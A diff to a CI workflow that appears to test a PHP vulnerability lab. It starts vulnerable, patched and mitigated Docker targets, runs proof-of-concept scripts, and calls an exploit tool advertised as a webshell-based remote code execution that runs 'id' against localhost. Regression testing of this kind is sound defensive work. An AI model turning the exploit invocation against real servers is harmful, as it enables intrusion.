@@ -26,7 +26,9 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: Start the lab (vulnerable / fixed / mitigated targets)
-        run: docker compose up -d
+        # -p pins the project name so container names are deterministic
+        # (phpaftershell-victim-1, ...) regardless of checkout directory.
+        run: docker compose -p phpaftershell up -d
       - name: Wait for the targets
         run: |
           for i in $(seq 1 30); do
@@ -44,16 +46,14 @@ jobs:
         run: python poc/stage2_oom.py
 
       - name: "Remote exploit - 100% HTTP RCE (webshell + command)"
-        run: |
-          chmod 777 app
-          ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id' --attempts 40
+        # the lab makes the webroot writable itself (compose command)
+        run: ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id' --attempts 40
 
-      - name: Control - fixed version must not be exploitable (stage 1 semantics)
-        run: python poc/stage1_splice.py 8088 || true
-        # stage1 writes the mixed state directly, so the fixed version still
-        # parses it (that is the parser, not the bug). The real control is
-        # stage2/interruption-based paths, covered by the mitigated target:
-      - name: Control - mitigated target (upload progress off) has no progress record
+      - name: "Control - patched PHP (8.4.28) must not be exploitable"
+        # same real interruption path, must exhaust attempts without a hit
+        run: "! ./phpaftershell-poc --target http://127.0.0.1:8088 --command 'id' --attempts 8"
+
+      - name: "Control - mitigated target (upload progress off) has no progress record"
         run: |
           SID=$(python -c 'import uuid;print(uuid.uuid4().hex)')
           curl -s -m 5 -b "PHPSESSID=$SID" \
